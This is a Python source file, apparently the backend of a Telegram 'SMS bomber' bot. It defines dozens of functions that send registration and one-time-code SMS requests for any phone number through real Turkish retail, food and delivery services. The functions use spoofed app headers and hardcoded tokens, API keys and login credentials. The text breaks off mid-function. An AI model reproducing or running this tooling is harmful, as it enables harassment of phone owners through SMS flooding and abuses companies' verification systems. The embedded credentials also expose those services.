import telebot
import json
import requests
import urllib
import telebot
from PIL import Image, ImageDraw, ImageFont, ImageFilter
from io import BytesIO
import requests
import random
from pytube import YouTube
from youtube_search import YoutubeSearch
import os
import types
import requests
import urllib.parse
from telebot import TeleBot, types

#

def KahveDunyasi(number):    
    try:    
        url = "https://core.kahvedunyasi.com:443/api/users/sms/send"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Page-Url": "/kayit-ol",
            "Content-Type": "application/json;charset=utf-8",
            "Positive-Client": "kahvedunyasi",
            "Positive-Client-Type": "web",
            "Store-Id": "1",
            "Origin": "https://www.kahvedunyasi.com",
            "Dnt": "1",
            "Sec-Gpc": "1",
            "Referer": "https://www.kahvedunyasi.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Te": "trailers",
            "Connection": "close"
        }
        json_data = {"mobile_number": number, "token_type": "register_token"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "KahveDunyasi"
        else:
            return False, "KahveDunyasi"
    except:    
        return False, "KahveDunyasi"


def Wmf(number):
    try:
        wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
            "confirm": "true",
            "date_of_birth": "1956-03-01",
            "email": "",  # Replace with appropriate email data
            "email_allowed": "true",
            "first_name": "Memati",
            "gender": "male",
            "last_name": "Bas",
            "password": "31ABC..abc31",
            "phone": f"0{number}"
        }, timeout=6)
        if wmf.status_code == 202:
            return True, "Wmf"
        else:
            return False, "Wmf"
    except:
        return False, "Wmf"


def Icq(number):
    try:
        url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{number}&platform=ios&r=796356153&smsFormatType=human"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate"
        }
        r = requests.post(url, headers=headers, timeout=6)
        if r.json()["response"]["statusCode"] == 200:
            return True, "Icq"
        else:
            return False, "Icq"
    except:
        return False, "Icq"


def Suiste(number):
    try:
        url = "https://suiste.com:443/api/auth/code"
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC",
            "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4",
            "Accept-Language": "en"
        }
        data = {"action": "register", "gsm": number}
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.json()["code"] == "common.success":
            return True, "Suiste"
        else:
            return False, "Suiste"
    except:
        return False, "Suiste"
            
    
def Evidea(number):
    try:
        url = "https://www.evidea.com:443/users/register/"
        headers = {
            "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
            "X-Project-Name": "undefined",
            "Accept": "application/json, text/plain, */*",
            "X-App-Type": "akinon-mobile",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "tr-TR,tr;q=0.9",
            "Cache-Control": "no-store",
            "Accept-Encoding": "gzip, deflate",
            "X-App-Device": "ios",
            "Referer": "https://www.evidea.com/",
            "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
            "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
        }
        data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{number}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.status_code == 202:
            return True, "Evidea"
        else:
            return False, "Evidea"
    except:
        return False, "Evidea"



    #345dijital.com
def Ucdortbes(number):
    try:
        url = "https://api.345dijital.com:443/api/users/register"
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": "null",
            "Connection": "close"
        }
        json_data = {
            "email": "",
            "name": "Memati",
            "phoneNumber": f"+90{number}",
            "surname": "Bas"
        }
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        response_json = r.json()
        if "error" in response_json and response_json["error"] == "E-Posta veya telefon zaten kayıtlı!":
            return False, "345dijital.com"
        elif r.status_code == 200:
            return True, "345dijital.com"
        else:
            return False, "345dijital.com"
    except Exception as e:
        return False, f"345dijital.com: {str(e)}"


#ayyildiz.com.tr
def Ayyildiz(number):
    try:
        url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={number}"
        headers = {
            "Accept": "*/*",
            "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS",
            "Devicetype": "mobileapp",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7",
            "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"
        }
        r = requests.post(url, headers=headers, timeout=6)
        response_json = r.json()
        if response_json.get("Success", False):
            return True, "ayyildiz.com.tr"
        else:
            return False, "ayyildiz.com.tr"
    except Exception as e:
        return False, f"ayyildiz.com.tr: {str(e)}"


#naosstars.com
def Naosstars(number):
    try:
        url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
        headers = {
            "Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351",
            "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "Access-Control-Allow-Origin": "*",
            "Locale": "en-TR",
            "Version": "1.0030",
            "Os": "ios",
            "Apiurl": "https://api.naosstars.com/api/",
            "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC",
            "Platform": "ios",
            "Accept-Language": "en-US,en;q=0.9",
            "Timezone": "Europe/Istanbul",
            "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517",
            "Timezoneoffset": "-180",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Apitype": "mobile_app"
        }
        json_data = {"telephone": f"+90{number}", "type": "register"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "naosstars.com"
        else:
            return False, "naosstars.com"
    except Exception as e:
        return False, f"naosstars.com: {str(e)}"


#koton.com
def Koton(number):
    try:
        url = "https://www.koton.com:443/users/register/"
        headers = {
            "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk",
            "X-Project-Name": "rn-env",
            "Accept": "application/json, text/plain, */*",
            "X-App-Type": "akinon-mobile",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-store",
            "Accept-Encoding": "gzip, deflate",
            "X-App-Device": "ios",
            "Referer": "https://www.koton.com/",
            "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0",
            "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
        }
        data = f"""--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="first_name"

Memati
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="last_name"

Bas
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="email"

{self.mail}
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="password"

31ABC..abc31
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="phone"

0{number}
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="confirm"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="sms_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="email_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="date_of_birth"

1993-07-02
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="call_allowed"

true
--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk
content-disposition: form-data; name="gender"



--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--
"""
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.status_code == 202:
            return True, "koton.com"
        else:
            raise
    except:
        return False, "koton.com"


#metro-tr.com
def Metro(number):
    try:
        url = "https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip, deflate",
            "Applicationversion": "2.1.1",
            "Applicationplatform": "2",
            "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1",
            "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9",
            "Connection": "close"
        }
        json_data = {"methodType": "2", "mobilePhoneNumber": f"+90{number}"}
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.json()["status"] == "success":
            return True, "metro-tr.com"
        else:
            raise
    except:
        return False, "metro-tr.com"


        
#ak-asya.com.tr
def Akasya(number):
    try:
        url = "https://akasya-admin.poilabs.com:443/v1/tr/sms"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
        json={"phone": number}
        r = requests.post(url=url, headers=headers, json=json, timeout=6)
        if r.json()["result"] == "SMS sended succesfully!":
            return True, "akasya-admin.poilabs.com"
        else:
            raise
    except:
        return False, "akasya-admin.poilabs.com"


#akbati.com
def Akbati(number):
    try:
        url = "https://akbati-admin.poilabs.com:443/v1/tr/sms"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akbat", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
        json={"phone": number}
        r = requests.post(url=url, headers=headers, json=json, timeout=6)
        if r.json()["result"] == "SMS sended succesfully!":
            return True, "akbati-admin.poilabs.com"
        else:
            raise
    except:
        return False, "akbati-admin.poilabs.com"


#clickmelive.com
def Clickme(number):
    try:
        url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
        headers = {"Content-Type": "application/json", "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", "Client-Version": "1.4.0", "Client-Device": "IOS", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
        json={"phone": number}
        r = requests.post(url=url, json=json, headers=headers, timeout=6)
        if r.json()["isSuccess"] == True:
            return True, "mobile-gateway.clickmelive.com"
        else:
            raise
    except:
        return False, "mobile-gateway.clickmelive.com"
    
    
    #happy.com.tr
def Happy(number):
    try:
        url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
        headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "Origin": "https://www.happy.com.tr", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Referer": "https://www.happy.com.tr/index.php?route=account/register"}
        data = {"telephone": number}
        r = requests.post(url=url, data=data, headers=headers, timeout=6)
        if r.status_code == 200:
            return True, "happy.com.tr"
        else:
            raise
    except:
        return False, "happy.com.tr"


#komagene.com.tr
def Komagene(number):
    try:
        url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
        json={"Telefon": number,"FirmaId": "32"}
        headers = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"}
        r = requests.post(url=url, headers=headers, json=json, timeout=6)
        if r.json()["Success"] == True:
            return True, "gateway.komagene.com.tr"
        else:
            raise
    except:
        return False, "gateway.komagene.com.tr"


#kuryemgelsin.com
def KuryemGelsin(number):
    try:
        url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
        json={"phoneNumber": number, "phone_country_code": "+90"}
        r = requests.post(url=url, json=json, timeout=6)
        if r.status_code == 200:
            return True, "api.kuryemgelsin.com"
        else:
            raise
    except:
        return False, "api.kuryemgelsin.com"


#porty.tech
def Porty(number):
    try:
        url = "https://panel.porty.tech:443/api.php?"
        headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
        json={"job": "start_login", "phone": number}
        r = requests.post(url=url, json=json, headers=headers, timeout=6)
        if r.json()["status"]== "success":
            return True, "panel.porty.tech"
        else:
            raise
    except:
        return False, "panel.porty.tech"
            
    
#taksim.digital
def Taksim(number):
    try:
        url = "https://service.taksim.digital:443/services/PassengerRegister/Register"
        headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}
        json={"countryPhoneCode": "+90", "name": "Memati", "phoneNo": number, "surname": "Bas"}
        r = requests.post(url=url, headers=headers, json=json, timeout=6)
        if r.json()["success"]== True:
            return True, "service.taksim.digital"
        else:
            raise
    except:
        return False, "service.taksim.digital"


#vakiftasdelensu.com
def Tasdelen(number):
    try:
        url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
        json= {"PhoneNumber": number, "user": {"Password": "Aa123!35@1","UserName": "MobilOperator"}}
        r = requests.post(url=url, json=json, timeout=6)
        if r.json()["Result"]== True:
            return True, "94.102.66.162:80"
        else:
            raise
    except:
        return False, "94.102.66.162:80"


#tasimacim.com
def Tasimacim(number):
    try:
        url = "https://server.tasimacim.com/requestcode"
        json= {"phone": number, "lang": "tr"}
        r = requests.post(url=url, json=json, timeout=6)
        if r.status_code == 200:
            return True, "server.tasimacim.com"
        else:
            raise
    except:
        return False, "server.tasimacim.com"


#toptanteslim.com
def ToptanTeslim(number):
    try:
        url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
        headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json", "Mode": "no-cors", "U": "e-ticaret", "User-Agent": "eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
        data = {
            "ADRES": "ZXNlZGtm", 
            "DIL": "tr_TR", 
            "EPOSTA": "",
            "EPOSTA_BILDIRIM": True, 
            "ILCE": "BAŞAKŞEHİR", 
            "ISLEM": "KayitOl", 
            "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", 
            "KIMLIKNO": None, 
            "KULLANICI_ADI": "Memati", 
            "KULLANICI_SOYADI": "Bas", 
            "PARA_BIRIMI": "TL", 
            "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", 
            "POSTAKODU": "377777", 
            "SEHIR": "İSTANBUL", 
            "SEMT": "BAŞAKŞEHİR MAH.", 
            "SMS_BILDIRIM": True, 
            "TELEFON": number, 
            "TICARI_UNVAN": "kdkd", 
            "ULKE_ID": 1105, 
            "VERGI_DAIRESI": "sjje", 
            "VERGI_NU": ""
        }
        r = requests.post(url, headers=headers, data=data, timeout=6)
        if r.json()["Durum"] == True:
            return True, "toptanteslim.com"
        else:
            raise
    except:
        return False, "toptanteslim.com"


#uysalmarket.com.tr
def Uysal(number):
    try:
        url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "UM Uysal Online Market/1.0.15 (team.clevel.uysalmarket; build:1; iOS 15.8.0) Alamofire/5.4.1", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
        json={"telefon_no": number}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.status_code == 200:
            return True, "api.uysalmarket.com.tr"
        else:
            raise
    except:
        return False, "api.uysalmarket.com.tr"


#yapp.com.tr
def Yapp(number):
    try:
        url = "https://yapp.com.tr:443/api/mobile/v1/register"
        json_data = {
            "app_version": "1.1.2", 
            "code": "tr", 
            "device_model": "iPhone9,4", 
            "device_name": "", 
            "device_type": "I", 
            "device_version": "15.7.8", 
            "email": "",
            "firstname": "Memati", 
            "is_allow_to_communication": "1", 
            "language_id": "1", 
            "lastname": "Bas", 
            "telefon_no": number, 
            "sms_code": ""
        }
        r = requests.post(url=url, json=json_data, timeout=6)
        if r.status_code == 200:
            return True, "yapp.com.tr"
        else:
            raise
    except:
        return False, "yapp.com.tr"


#yilmazticaret.net
def YilmazTicaret(number):
    try:
        url = "http://www.yilmazticaret.net:80/restapi2/register/"
        headers = {"Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}
        data = {"telefon": (None, f"0 {number}"),"token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
        r = requests.post(url, headers=headers,  data=data, timeout=6)
        if r.json()["giris"] == "success":
            return True, "yilmazticaret.net"
        else:
            raise
    except:
        return False, "yilmazticaret.net"


#yuffi.co
def Yuffi(number):
    try:
        url = "https://api.yuffi.co/api/parent/login/user"
        json = {"phone": number, "kvkk": True}
        r = requests.post(url, json=json, timeout=6)
        if r.json()["success"] == True:
            return True, "api.yuffi.co"
        else:
            raise
    except:
        return False, "api.yuffi.co"


#beefull.com
def Beefull(number):
    try:
        url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
        json_data = {
            "email": "",  # E-posta adresi boş olacak
            "firstName": "Memati", 
            "language": "tr", 
            "lastName": "Bas", 
            "password": "123456", 
            "phoneCode": "90", 
            "phoneNumber": number, 
            "tenant": "beefull", 
            "username": ""
        }
        requests.post(url, json=json_data, timeout=4)
        url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
        json_data = {
            "phoneCode": "90", 
            "phoneNumber": number, 
            "tenant": "beefull"
        }
        r = requests.post(url, json=json_data, timeout=4)
        if r.status_code == 200:
            return True, "app.beefull.io"
        else:
            raise
    except:
        return False, "app.beefull.io"


#starbucks.com.tr
def Starbucks(number):
    try:
        url = "https://auth.sbuxtr.com:443/signUp"
        headers = {"Content-Type": "application/json", "Operationchannel": "ios", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br"}
        json_data = {
            "allowEmail": True,
            "allowSms": True,
            "deviceId": "31",
            "email": "",
            "firstName": "Memati",
            "lastName": "Bas",
            "password": "31ABC..abc31",
            "phoneNumber": number,
            "preferredName": "Memati"
        }
        r = requests.post(url, headers=headers, json=json_data, timeout=6)
        if r.json()["code"] == 50:
            return True, "auth.sbuxtr.com"
        else:
            raise
    except:
        return False, "auth.sbuxtr.com"


#dominos.com.tr
def Dominos(number):
    try:
        url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
        headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
        json={"email": "", "isSure": False, "mobilePhone": number}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["isSuccess"] == True:
            return True, "frontend.dominos.com.tr"
        else:
            raise
    except:
        return False, "frontend.dominos.com.tr"


#baydoner.com
def Baydoner(number):
    try:
        url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
        headers = {"Content-Type": "application/json", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.9", "Platform": "1", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
        json={"AppVersion": "1.3.2", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "31s", "DeviceModel": "31", "DeviceToken": "3w1", "Email": "", "GDPRPolicy": False, "Gender": "Erkek", "GenderId": 1, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "31", "NotificationToken": "31", "OsSystem": "IOS", "Password": "31Memati31", "PhoneNumber": number, "Platform": 1, "sessionID": "31", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 942603, "TermsAndConditions": False}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["Control"] == 1:
            return True, "crmmobil.baydoner.com"
        else:
            raise
    except:
        return False, "crmmobil.baydoner.com"


#pidem.com.tr
def Pidem(number):
    try:
        url = "https://restashop.azurewebsites.net:443/graphql/"
        headers = {"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Authorization": "Bearer null", "Referer": "https://pidem.azurewebsites.net/", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Accept-Encoding": "gzip, deflate, br"}
        json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": number}}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
            return True, "restashop.azurewebsites.net"
        else:
            raise
    except:
        return False, "restashop.azurewebsites.net"


#frink.com.tr
def Frink(phone):
    try:
        url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
        headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
        json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90" + phone}
        r = requests.post(url, headers=headers, json=json, timeout=6)
        if r.json()["processStatus"] == "SUCCESS":
            return True, "api.frink.com.tr"
        else:
            raise
    except:
        return False, "api.frink.com.tr"



def a101(number):
    try:
        url = "https://www.a101.com.tr/users/otp-login/"
        payload = {
            "phone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "A101"
        else:
            return False, "A101"
    except:
        return False, "A101"

def bim(number):
    try:
        url = "https://bim.veesk.net/service/v1.0/account/login"
        payload = {
            "phone" : f"90{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "BIM"
        else:
            return False, "BIM"
    except:
        return False, "BIM"


def defacto(number):
    try:
        url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
        payload = {
            "mobilePhone" : f"0{number}"
        }
        r = requests.post(url=url, json=payload, timeout=5)
        r1 = json.loads(r.text)["Data"]
        if r1 == "IsSMSSend":
            return True, "Defacto"
        else:
            return False, "Defacto"
    except:
        return False, "Defacto"

def istegelsin(number):
    try:
        url = "https://prod.fasapi.net/"
        payload = {
            "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
            "variables" : {
                "phoneNumber" : f"90{number}"
            }
        }
        r = requests.post(url=url, json=payload, timeout=5)
        if r.status_code == 200:
            return True, "İsteGelsin"
        else:
            return False, "İsteGelsin"
    except:
        return False, "İsteGelsin"


def ikinciyeni(number):
    try:
        url = "https://apigw.ikinciyeni.com/RegisterRequest"
        payload = {
            "accountType": 1,
            "email": f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
            "isAddPermission": False,
            "name": f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
